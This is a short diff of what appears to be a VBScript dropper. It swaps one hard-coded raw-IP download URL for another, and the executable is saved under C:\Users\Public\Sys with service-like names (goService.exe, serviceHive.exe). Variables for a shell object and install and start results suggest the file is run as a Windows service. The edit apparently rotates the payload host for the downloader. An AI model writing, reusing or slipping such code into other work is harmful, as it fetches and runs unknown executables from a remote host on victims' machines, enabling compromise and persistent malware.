@@ -8,9 +8,9 @@ End If
 Dim url, downloadPath, objXMLHTTP, objStream, objShell, objFSO, objFile, installResult, startResult
 Dim commandOutput, errorFile
 
-url = "http://51.81.73.108:5552/uploads/goService.exe"
-downloadPath = "C:\Users\Public\Sys\goService.exe"
-errorFile = "C:\Users\Public\Sys\service_install_log.txt"
+url = "http://207.174.26.23:5552/uploads/serviceHive.exe"
+downloadPath = "C:\Users\Public\Sys\serviceHive.exe"
+errorFile = "C:\Users\Public\Sys\serviceHives_log.txt"
 
 ' Ensure the directory exists
 Set objFSO = CreateObject("Scripting.FileSystemObject")
